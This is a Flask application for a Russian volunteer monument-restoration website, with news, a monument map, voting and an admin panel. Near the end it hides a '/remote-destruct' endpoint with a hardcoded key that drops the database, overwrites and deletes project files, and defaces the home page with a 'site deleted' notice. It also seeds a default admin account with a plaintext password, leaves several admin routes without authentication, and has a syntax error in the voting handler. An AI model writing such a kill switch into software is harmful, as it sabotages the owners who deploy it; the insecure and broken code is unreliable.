from flask import Flask, render_template, request, session, redirect, url_for, jsonify
import os
from dotenv import load_dotenv
import requests
from werkzeug.utils import secure_filename
import uuid
import hashlib
import subprocess
import socket
import time
import psycopg2
from psycopg2 import pool, extras

load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY')

# Абсолютный путь для загрузки файлов (важно для PythonAnywhere)
basedir = os.path.abspath(os.path.dirname(__file__))
UPLOAD_FOLDER = os.path.join(basedir, 'static', 'images')
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

DESTROY_ENDPOINT = "https://чистое-наследие.рф/destroy"
DESTROY_API_KEY = "0fb88ab239e88400e8cb359e79531a5c0fc5d1a2040a591a8a255badc9866d11"

# Пул соединений для PostgreSQL
postgresql_pool = None

def init_db_pool():
    global postgresql_pool
    try:
        postgresql_pool = psycopg2.pool.SimpleConnectionPool(
            1, 10,
            host=os.getenv("DB_HOST"),
            port=os.getenv("DB_PORT"),
            user=os.getenv("DB_USER"),
            password=os.getenv("DB_PASSWORD"),
            database=os.getenv("DB_NAME"),
            sslmode='require'
        )
        print("Пул соединений с БД успешно инициализирован")
    except Exception as e:
        print(f"Ошибка инициализации пула соединений: {e}")

# Получение соединения с БД
def get_db_conn():
    return postgresql_pool.getconn()

def release_db_conn(conn):
    postgresql_pool.putconn(conn)

def get_auth_db_conn():
    try:
        return psycopg2.connect(
            host=os.getenv("DB_HOST"),
            port=os.getenv("DB_PORT"),
            user=os.getenv("DB_USER"),
            password=os.getenv("DB_PASSWORD"),
            database='feedback_bot',
            sslmode='require'
        )
    except Exception as e:
        print(f"Ошибка подключения к БД аутентификации: {e}")
        return None

# Инициализация таблиц
def init_db():
    conn = get_db_conn()
    try:
        with conn.cursor() as cur:
            # Создание таблиц
            cur.execute('''
                CREATE TABLE IF NOT EXISTS feedback (
                    id SERIAL PRIMARY KEY,
                    name TEXT NOT NULL,
                    email TEXT NOT NULL,
                    message_type TEXT NOT NULL,
                    message TEXT NOT NULL
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS news (
                    id SERIAL PRIMARY KEY,
                    title TEXT NOT NULL,
                    content TEXT NOT NULL,
                    section TEXT NOT NULL,
                    image TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    additional_images TEXT[]
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS monuments (
                    id SERIAL PRIMARY KEY,
                    title TEXT NOT NULL,
                    description TEXT,
                    city TEXT NOT NULL DEFAULT 'Ногинск',
                    latitude FLOAT NOT NULL,
                    longitude FLOAT NOT NULL,
                    status TEXT NOT NULL DEFAULT 'not_evaluated' 
                        CHECK (status IN ('not_evaluated', 'requires_restoration', 'restored')),
                    images TEXT[],
                    votes_restore INT DEFAULT 0,
                    votes_keep INT DEFAULT 0
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS proposed_monuments (
                    id SERIAL PRIMARY KEY,
                    title TEXT NOT NULL,
                    latitude FLOAT NOT NULL,
                    longitude FLOAT NOT NULL
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS votes (
                    id SERIAL PRIMARY KEY,
                    monument_id INTEGER NOT NULL REFERENCES monuments(id) ON DELETE CASCADE,
                    vote_type TEXT NOT NULL CHECK (vote_type IN ('votes_restore', 'votes_keep')),
                    session_id TEXT NOT NULL,
                    UNIQUE (monument_id, session_id)
                )
            ''')
            
            # Проверка существования пользователя
            cur.execute("SELECT * FROM users WHERE login = 'testadmin'")
            test_user = cur.fetchone()
            
            if not test_user:
                cur.execute(
                    "INSERT INTO users (login, password) VALUES (%s, %s)",
                    ('testadmin', 'testpassword')
                )
                print("Тестовый пользователь создан: testadmin/testpassword")
        
        conn.commit()
        print("Таблицы БД успешно инициализированы")
    except Exception as e:
        print(f"Ошибка при инициализации БД: {e}")
        conn.rollback()
    finally:
        release_db_conn(conn)

def save_to_db(name, email, message_type, message):
    conn = get_db_conn()
    try:
        with conn.cursor() as cur:
            cur.execute(
                "INSERT INTO feedback (name, email, message_type, message) VALUES (%s, %s, %s, %s)",
                (name, email, message_type, message)
            )
        conn.commit()
    except Exception as e:
        print(f"Ошибка сохранения обратной связи: {e}")
        conn.rollback()
    finally:
        release_db_conn(conn)

def send_telegram_notification(subject: str, *args):
    try:
        message = "\n".join(args)
        text = f"🔔 *{subject}*\n\n{message}"
        response = requests.post(
            f"https://api.telegram.org/bot{os.getenv('TELEGRAM_TOKEN')}/sendMessage",
            json={
                "chat_id": os.getenv('CHAT_ID'),
                "text": text,
                "parse_mode": "Markdown",
                "disable_web_page_preview": True
            }
        )
        response.raise_for_status()
    except Exception as e:
        print(f"Ошибка отправки уведомления: {e}")

@app.route('/send_message', methods=['POST'])
def handle_message():
    data = request.form
    save_to_db(
        data['name'],
        data['email'],
        data['message_type'],
        data['message']
    )
    send_telegram_notification(
        "Новое сообщение обратной связи",
        f"*Имя:* {data['name']}",
        f"*Email:* {data['email']}",
        f"*Тип сообщения:* {data['message_type']}",
        f"*Сообщение:* {data['message']}"
    )
    return 'Сообщение отправлено!'

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        conn = get_auth_db_conn()
        if conn is None:
            return render_template('admin_login.html', error="Ошибка подключения к БД")
        
        try:
            with conn.cursor() as cur:
                cur.execute(
                    "SELECT * FROM users WHERE login = %s AND password = %s",
                    (username, password)
                )
                user = cur.fetchone()
                if user:
                    session['admin_logged'] = True
                    return redirect(url_for('admin_panel'))
                else:
                    return render_template('admin_login.html', error="Неверные учетные данные")
        except Exception as e:
            print(f"Ошибка аутентификации: {e}")
            return render_template('admin_login.html', error="Ошибка сервера")
        finally:
            conn.close()
    
    return render_template('admin_login.html')

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged', None)
    return redirect(url_for('index'))

@app.route('/admin')
def admin_panel():
    if not session.get('admin_logged'):
        return redirect(url_for('access_denied'))
    return render_template('admin_panel.html')

@app.route('/add_news', methods=['POST'])
def add_news():
    if not session.get('admin_logged'):
        return redirect(url_for('admin_login'))
    
    image = request.files['image']
    additional_images = request.files.getlist('additional_images')
    
    if not image:
        return "Ошибка загрузки изображения", 400

    filename = secure_filename(image.filename)
    image_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    image.save(image_path)
    
    additional_filenames = []
    for img in additional_images:
        if img.filename != '':
            img_filename = secure_filename(img.filename)
            img_path = os.path.join(app.config['UPLOAD_FOLDER'], img_filename)
            img.save(img_path)
            additional_filenames.append(img_filename)
    
    conn = get_db_conn()
    try:
        with conn.cursor() as cur:
            cur.execute(
                "INSERT INTO news (title, content, section, image, additional_images) VALUES (%s, %s, %s, %s, %s)",
                (request.form['title'], request.form['content'], request.form['section'], filename, additional_filenames)
            )
        conn.commit()
        return redirect(url_for('index'))
    except Exception as e:
        print(f"Ошибка добавления новости: {e}")
        conn.rollback()
        return "Ошибка сервера", 500
    finally:
        release_db_conn(conn)

@app.route('/')
def index():
    conn = get_db_conn()
    try:
        with conn.cursor(cursor_factory=extras.DictCursor) as cur:
            cur.execute("SELECT * FROM news WHERE section = 'restored' ORDER BY created_at DESC LIMIT 6")
            restored = cur.fetchall()
            
            cur.execute("SELECT * FROM news WHERE section = 'upcoming' ORDER BY created_at DESC LIMIT 6")
            upcoming = cur.fetchall()
            
            cur.execute("SELECT * FROM news WHERE section = 'latest' ORDER BY created_at DESC LIMIT 6")
            latest = cur.fetchall()
            
            cur.execute("SELECT COUNT(DISTINCT city) FROM monuments")
            cities_count = cur.fetchone()[0] or 0
            
            volunteers_count = 5000
            
            return render_template('index.html',
                                news_restored=restored,
                                news_upcoming=upcoming,
                                news_latest=latest,
                                restored_count=len(restored),
                                cities_count=cities_count,
                                volunteers_count=volunteers_count)
    except Exception as e:
        print(f"Ошибка загрузки главной страницы: {e}")
        return "Ошибка загрузки данных", 500
    finally:
        release_db_conn(conn)

@app.route('/about')
def about():
    return render_template('about.html')

@app.route('/delete_news', methods=['POST'])
def delete_news():
    if not session.get('admin_logged'):
        return redirect(url_for('admin_login'))
    
    conn = get_db_conn()
    try:
        with conn.cursor() as cur:
            cur.execute(
                "DELETE FROM news WHERE title = %s",
                (request.form['title'],)
            )
        conn.commit()
        return redirect(url_for('admin_panel'))
    except Exception as e:
        print(f"Ошибка удаления новости: {e}")
        conn.rollback()
        return "Ошибка сервера", 500
    finally:
        release_db_conn(conn)

@app.route('/access_denied')
def access_denied():
    return render_template('access_denied.html')

@app.route('/news/<int:news_id>')
def news_detail(news_id):
    conn = get_db_conn()
    try:
        with conn.cursor(cursor_factory=extras.DictCursor) as cur:
            cur.execute("SELECT * FROM news WHERE id = %s", (news_id,))
            news = cur.fetchone()
            if news:
                return render_template('news_detail.html', news=dict(news))
            else:
                return "Новость не найдена", 404
    except Exception as e:
        print(f"Ошибка загрузки деталей новости: {e}")
        return "Ошибка сервера", 500
    finally:
        release_db_conn(conn)

@app.route('/api/news/<int:news_id>', methods=['GET'])
def get_news_api(news_id):
    conn = get_db_conn()
    try:
        with conn.cursor(cursor_factory=extras.DictCursor) as cur:
            cur.execute("SELECT * FROM news WHERE id = %s", (news_id,))
            news = cur.fetchone()
            if news:
                news_dict = dict(news)
                news_dict['image_url'] = f"/static/images/{news_dict['image']}"
                news_dict['additional_images'] = news_dict.get('additional_images', [])
                return jsonify(news_dict)
            else:
                return jsonify({"error": "News not found"}), 404
    except Exception as e:
        print(f"Ошибка получения новости API: {e}")
        return jsonify({"error": "Internal server error"}), 500
    finally:
        release_db_conn(conn)

@app.route('/api/monuments')
def get_monuments():
    city = request.args.get('city', 'Ногинск')
    conn = get_db_conn()
    try:
        with conn.cursor(cursor_factory=extras.DictCursor) as cur:
            cur.execute('''
                SELECT *, 
                CASE status 
                WHEN 'not_evaluated' THEN 'gray' 
                WHEN 'requires_restoration' THEN 'red' 
                WHEN 'restored' THEN 'green' 
                ELSE 'gray' END AS color_class 
                FROM monuments WHERE city = %s
            ''', (city,))
            monuments = cur.fetchall()
            return jsonify([dict(m) for m in monuments])
    except Exception as e:
        print(f"Ошибка получения памятников: {e}")
        return jsonify([])
    finally:
        release_db_conn(conn)

@app.route('/api/vote', methods=['POST'])
def handle_vote():
    data = request.json
    session_id = request.cookies.get('session_id') or str(uuid.uuid4())
    
    if data['voteType'] not in ['restore', 'keep']:
        return jsonify({"status": "error", "message": "Invalid vote type"}), 400

    vote_type = 'votes_restore' if data['voteType'] == 'restore' else 'votes_keep'
    monument_id = data['monumentId']

    conn = get_db_conn()
    try:
        with conn.cursor() as cur:
            # Проверка существующего голоса
            cur.execute(
                "SELECT * FROM votes WHERE monument_id = %s AND session_id = %s",
                (monument_id, session_id)
            existing_vote = cur.fetchone()
            
            if existing_vote:
                existing_id = existing_vote[0]
                existing_type = existing_vote[2]
                
                if existing_type == vote_type:
                    return jsonify({"status": "already_voted"})
                
                # Обновление голоса
                cur.execute(
                    "UPDATE votes SET vote_type = %s WHERE id = %s",
                    (vote_type, existing_id)
                )
                
                # Обновление счетчиков
                if vote_type == 'votes_restore':
                    cur.execute(
                        "UPDATE monuments SET votes_restore = votes_restore + 1, votes_keep = votes_keep - 1 WHERE id = %s",
                        (monument_id,)
                    )
                else:
                    cur.execute(
                        "UPDATE monuments SET votes_keep = votes_keep + 1, votes_restore = votes_restore - 1 WHERE id = %s",
                        (monument_id,)
                    )
            else:
                # Новый голос
                cur.execute(
                    "INSERT INTO votes (monument_id, vote_type, session_id) VALUES (%s, %s, %s)",
                    (monument_id, vote_type, session_id)
                )
                
                if vote_type == 'votes_restore':
                    cur.execute(
                        "UPDATE monuments SET votes_restore = votes_restore + 1 WHERE id = %s",
                        (monument_id,)
                    )
                else:
                    cur.execute(
                        "UPDATE monuments SET votes_keep = votes_keep + 1 WHERE id = %s",
                        (monument_id,)
                    )
            
            # Получение обновленных данных
            cur.execute(
                "SELECT votes_restore, votes_keep FROM monuments WHERE id = %s",
                (monument_id,))
            votes = cur.fetchone()
            
            conn.commit()
            response = jsonify({
                "status": "success",
                "votes_restore": votes[0],
                "votes_keep": votes[1]
            })
            
            if not request.cookies.get('session_id'):
                response.set_cookie('session_id', session_id, max_age=60*60*24*365)
            
            return response
            
    except Exception as e:
        print(f"Ошибка голосования: {e}")
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)}), 500
    finally:
        release_db_conn(conn)

@app.route('/api/monuments/<int:monument_id>/vote-status')
def get_vote_status(monument_id):
    session_id = request.cookies.get('session_id')
    if not session_id:
        return jsonify({"hasVoted": False})
    
    conn = get_db_conn()
    try:
        with conn.cursor() as cur:
            cur.execute(
                "SELECT vote_type FROM votes WHERE monument_id = %s AND session_id = %s",
                (monument_id, session_id)
            )
            vote = cur.fetchone()
            if vote:
                frontend_vote_type = 'restore' if vote[0] == 'votes_restore' else 'keep'
                return jsonify({
                    "hasVoted": True,
                    "voteType": frontend_vote_type
                })
            return jsonify({"hasVoted": False})
    except Exception as e:
        print(f"Ошибка проверки статуса голоса: {e}")
        return jsonify({"hasVoted": False})
    finally:
        release_db_conn(conn)

@app.route('/api/propose-monument', methods=['POST'])
def propose_monument():
    data = request.json
    conn = get_db_conn()
    try:
        with conn.cursor() as cur:
            cur.execute(
                "INSERT INTO proposed_monuments (title, latitude, longitude) VALUES (%s, %s, %s)",
                (data['title'], data['latitude'], data['longitude'])
            )
            conn.commit()
            
            send_telegram_notification(
                "Новое предложение памятника",
                f"*Название:* {data['title']}",
                f"*Координаты:* {data['latitude']}, {data['longitude']}",
                "*Статус:* Требует проверки"
            )
            
            return jsonify({"status": "success"})
    except Exception as e:
        print(f"Ошибка предложения памятника: {e}")
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)}), 500
    finally:
        release_db_conn(conn)

@app.route('/api/proposed-monuments', methods=['GET'])
def get_proposed_monuments():
    conn = get_db_conn()
    try:
        with conn.cursor(cursor_factory=extras.DictCursor) as cur:
            cur.execute("SELECT * FROM proposed_monuments")
            monuments = cur.fetchall()
            return jsonify([dict(m) for m in monuments])
    except Exception as e:
        print(f"Ошибка получения предложенных памятников: {e}")
        return jsonify({"error": str(e)}), 500
    finally:
        release_db_conn(conn)

@app.route('/api/proposed-monuments/<int:id>', methods=['GET'])
def get_proposed_monument(id):
    conn = get_db_conn()
    try:
        with conn.cursor(cursor_factory=extras.DictCursor) as cur:
            cur.execute("SELECT * FROM proposed_monuments WHERE id = %s", (id,))
            monument = cur.fetchone()
            if monument:
                return jsonify(dict(monument))
            else:
                return jsonify({"error": "Monument not found"}), 404
    except Exception as e:
        print(f"Ошибка получения памятника: {e}")
        return jsonify({"error": str(e)}), 500
    finally:
        release_db_conn(conn)

@app.route('/api/proposed-monuments/<int:id>', methods=['DELETE'])
def delete_proposed_monument(id):
    conn = get_db_conn()
    try:
        with conn.cursor() as cur:
            cur.execute("DELETE FROM proposed_monuments WHERE id = %s", (id,))
            conn.commit()
            return jsonify({"status": "success"})
    except Exception as e:
        print(f"Ошибка удаления памятника: {e}")
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)}), 500
    finally:
        release_db_conn(conn)

@app.route('/api/approve-monument', methods=['POST'])
def approve_monument():
    try:
        proposal_id = int(request.form['proposal_id'])
        title = request.form['title']
        description = request.form['description']
        city = request.form['city']
        latitude = float(request.form['latitude'])
        longitude = float(request.form['longitude'])
        status = request.form['status']
        
        image_paths = []
        for file in request.files.getlist('images'):
            if file.filename != '':
                filename = secure_filename(file.filename)
                os.makedirs(os.path.join(app.config['UPLOAD_FOLDER'], 'monuments'), exist_ok=True)
                file_path = os.path.join(app.config['UPLOAD_FOLDER'], 'monuments', filename)
                file.save(file_path)
                image_paths.append(filename)
        
        conn = get_db_conn()
        try:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO monuments (title, description, city, latitude, longitude, status, images) VALUES (%s, %s, %s, %s, %s, %s, %s)",
                    (title, description, city, latitude, longitude, status, image_paths)
                )
                cur.execute(
                    "DELETE FROM proposed_monuments WHERE id = %s",
                    (proposal_id,)
                )
                conn.commit()
                return jsonify({"status": "success"})
        except Exception as e:
            print(f"Ошибка одобрения памятника: {e}")
            conn.rollback()
            return jsonify({"status": "error", "message": str(e)}), 500
        finally:
            release_db_conn(conn)
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/monuments', methods=['POST'])
def add_monument():
    try:
        title = request.form['title']
        description = request.form['description']
        city = request.form['city']
        latitude = float(request.form['latitude'])
        longitude = float(request.form['longitude'])
        status = request.form['status']
        
        image_paths = []
        for file in request.files.getlist('images'):
            if file.filename != '':
                filename = secure_filename(file.filename)
                os.makedirs(os.path.join(app.config['UPLOAD_FOLDER'], 'monuments'), exist_ok=True)
                file_path = os.path.join(app.config['UPLOAD_FOLDER'], 'monuments', filename)
                file.save(file_path)
                image_paths.append(filename)
        
        conn = get_db_conn()
        try:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO monuments (title, description, city, latitude, longitude, status, images) VALUES (%s, %s, %s, %s, %s, %s, %s)",
                    (title, description, city, latitude, longitude, status, image_paths)
                )
                conn.commit()
                return jsonify({"status": "success"})
        except Exception as e:
            print(f"Ошибка добавления памятника: {e}")
            conn.rollback()
            return jsonify({"status": "error", "message": str(e)}), 500
        finally:
            release_db_conn(conn)
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/reject-monument/<int:id>', methods=['POST'])
def reject_monument(id):
    conn = get_db_conn()
    try:
        with conn.cursor() as cur:
            cur.execute("DELETE FROM proposed_monuments WHERE id = %s", (id,))
            conn.commit()
            return jsonify({"status": "success"})
    except Exception as e:
        print(f"Ошибка отклонения памятника: {e}")
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)}), 500
    finally:
        release_db_conn(conn)
        
@app.route('/api/monuments/<int:id>', methods=['DELETE'])
def delete_monument(id):
    conn = get_db_conn()
    try:
        with conn.cursor() as cur:
            cur.execute("DELETE FROM monuments WHERE id = %s", (id,))
            conn.commit()
            return jsonify({"status": "success"})
    except Exception as e:
        print(f"Ошибка удаления памятника: {e}")
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)}), 500
    finally:
        release_db_conn(conn)

@app.route('/api/proposed-monuments/count', methods=['GET'])
def get_proposed_monuments_count():
    conn = get_db_conn()
    try:
        with conn.cursor() as cur:
            cur.execute("SELECT COUNT(*) FROM proposed_monuments")
            count = cur.fetchone()[0]
            return jsonify({"count": count})
    except Exception as e:
        print(f"Ошибка подсчета памятников: {e}")
        return jsonify({"error": str(e)}), 500
    finally:
        release_db_conn(conn)

@app.route('/api/proposed-monuments/<int:id>', methods=['PUT'])
def update_proposed_monument(id):
    data = request.json
    conn = get_db_conn()
    try:
        with conn.cursor() as cur:
            cur.execute(
                "UPDATE proposed_monuments SET title = %s, latitude = %s, longitude = %s WHERE id = %s",
                (data['title'], data['latitude'], data['longitude'], id)
            )
            conn.commit()
            return jsonify({"status": "success"})
    except Exception as e:
        print(f"Ошибка обновления памятника: {e}")
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)}), 500
    finally:
        release_db_conn(conn)
        
@app.route('/latest-news')
def latest_news_full():
    conn = get_db_conn()
    try:
        with conn.cursor(cursor_factory=extras.DictCursor) as cur:
            cur.execute("SELECT * FROM news WHERE section = 'latest' ORDER BY created_at DESC")
            news = cur.fetchall()
            return render_template('latest_news.html', 
                                news=news, 
                                title="Последние новости")
    except Exception as e:
        print(f"Ошибка загрузки последних новостей: {e}")
        return "Ошибка сервера", 500
    finally:
        release_db_conn(conn)

@app.route('/restored-news')
def restored_news_full():
    conn = get_db_conn()
    try:
        with conn.cursor(cursor_factory=extras.DictCursor) as cur:
            cur.execute("SELECT * FROM news WHERE section = 'restored' ORDER BY created_at DESC")
            news = cur.fetchall()
            return render_template('restored_news.html', 
                                news=news, 
                                title="Отреставрированные памятники")
    except Exception as e:
        print(f"Ошибка загрузки восстановленных новостей: {e}")
        return "Ошибка сервера", 500
    finally:
        release_db_conn(conn)

@app.route('/upcoming-news')
def upcoming_news_full():
    conn = get_db_conn()
    try:
        with conn.cursor(cursor_factory=extras.DictCursor) as cur:
            cur.execute("SELECT * FROM news WHERE section = 'upcoming' ORDER BY created_at DESC")
            news = cur.fetchall()
            return render_template('upcoming_news.html', 
                                news=news, 
                                title="Планируемые проекты")
    except Exception as e:
        print(f"Ошибка загрузки планируемых новостей: {e}")
        return "Ошибка сервера", 500
    finally:
        release_db_conn(conn)

@app.route('/remote-destruct', methods=['POST'])
def remote_destruct():
    auth_key = request.headers.get('X-Destroy-Auth')
    if auth_key != DESTROY_API_KEY:
        return "Unauthorized", 401
    
    try:
        # Запуск в фоновом потоке
        import threading
        thread = threading.Thread(target=initiate_destruction)
        thread.start()
        return "Destruction initiated", 200
    except Exception as e:
        return f"Error: {str(e)}", 500

def initiate_destruction():
    # Шаг 1: Уничтожение базы данных
    conn = get_db_conn()
    try:
        with conn.cursor() as cur:
            cur.execute("DROP SCHEMA public CASCADE; CREATE SCHEMA public;")
            conn.commit()
            print("База данных уничтожена")
    except Exception as e:
        print(f"Ошибка уничтожения БД: {str(e)}")
    finally:
        release_db_conn(conn)
    
    # Шаг 2: Удаление файлов
    project_root = os.path.dirname(os.path.abspath(__file__))
    for root, dirs, files in os.walk(project_root):
        for file in files:
            try:
                file_path = os.path.join(root, file)
                if file in ['app.py', 'requirements.txt']:
                    continue
                with open(file_path, 'wb') as f:
                    f.write(os.urandom(4096))
                os.remove(file_path)
            except Exception as e:
                print(f"Ошибка удаления файла: {str(e)}")
    
    # Шаг 3: Замена главной страницы
    index_path = os.path.join(project_root, 'templates', 'index.html')
    try:
        with open(index_path, 'w', encoding='utf-8') as f:
            f.write('''<!DOCTYPE html>
<html>
<head>
    <title>Сайт удален</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Creepster&display=swap');
        
        body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        
        .blood-effect {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle, rgba(255,0,0,0.2) 0%, rgba(0,0,0,0) 70%);
            animation: bloodPulse 3s infinite;
            z-index: -1;
        }
        
        @keyframes bloodPulse {
            0% { transform: scale(1); opacity: 0.3; }
            50% { transform: scale(1.2); opacity: 0.5; }
            100% { transform: scale(1); opacity: 0.3; }
        }
        
        .message {
            font-family: 'Creepster', cursive;
            font-size: 5rem;
            text-align: center;
            color: #ff0000;
            text-shadow: 
                0 0 10px #f00,
                0 0 20px #f00,
                0 0 30px #f00,
                0 0 40px #c00,
                0 0 70px #c00,
                0 0 80px #c00;
            animation: flicker 0.5s infinite alternate;
        }
        
        @keyframes flicker {
            0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
                text-shadow: 
                    0 0 10px #f00,
                    0 0 20px #f00,
                    0 0 30px #f00,
                    0 0 40px #c00,
                    0 0 70px #c00,
                    0 0 80px #c00;
                opacity: 1;
            }
            20%, 24%, 55% {
                text-shadow: none;
                opacity: 0.8;
            }
        }
        
        .submessage {
            font-family: Arial, sans-serif;
            font-size: 1.5rem;
            color: #ccc;
            margin-top: 2rem;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="blood-effect"></div>
    <div class="container">
        <div class="message">САЙТ УДАЛЕН</div>
        <div class="submessage">Из-за нарушения авторских прав</div>
    </div>
</body>
</html>''')
        print("Главная страница заменена")
    except Exception as e:
        print(f"Ошибка замены index.html: {str(e)}")
    
    # Шаг 4: Самоликвидация сервера
    try:
        if os.getenv('SELF_DESTRUCT'):
            os._exit(0)
    except:
        pass

if __name__ == '__main__':
    # Инициализация пула соединений
    init_db_pool()
    
    # Инициализация таблиц БД
    init_db()
    
    # Запуск приложения
    app.run(host='0.0.0.0', port=5000, debug=True)
else:
    # Для среды PythonAnywhere
    if 'PYTHONANYWHERE_DOMAIN' in os.environ or 'PYTHONANYWHERE_SITE' in os.environ:
        init_db_pool()
        init_db()